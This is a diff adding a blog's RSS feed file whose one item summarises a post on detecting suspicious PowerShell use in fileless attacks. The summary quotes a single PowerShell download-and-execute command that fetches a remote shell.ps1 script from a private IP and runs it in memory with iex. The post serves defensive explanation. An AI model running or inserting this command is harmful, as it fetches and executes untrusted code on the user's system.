@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>powershell on It&#39;s a Dev&#39;s world</title>
+    <link>https://jackleila.github.io/programming/public/tags/powershell/</link>
+    <description>Recent content in powershell on It&#39;s a Dev&#39;s world</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 05 Oct 2025 19:57:34 +0200</lastBuildDate>
+    <atom:link href="https://jackleila.github.io/programming/public/tags/powershell/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Detecting suspicious PowerShell usage</title>
+      <link>https://jackleila.github.io/programming/public/post/detecting-suspicious-powershell-usage/</link>
+      <pubDate>Sun, 05 Oct 2025 19:57:34 +0200</pubDate>
+      <guid>https://jackleila.github.io/programming/public/post/detecting-suspicious-powershell-usage/</guid>
+      <description>Detecting Suspicious PowerShell Usage In the recent years there was an increase in the fileless techniques that abuse Powershell and other applications (LOTLs) to download and execute malware. These attacks occur generally in memory, which makes detection more complicated than traditional malware.&#xA;Let&amp;rsquo;s take a look at this example:&#xA;powershell.exe -command &amp;quot;iex(New-Object Net.WebClient).DownloadString(‘http://10.10.13.1/shell.ps1’)&amp;quot;&#xA;The script shell.ps1 is downloaded and directly executed in memory through iex. Many times, attackers will encode or offuscate the commands to avoid the detection.</description>
+    </item>
+  </channel>
+</rss>
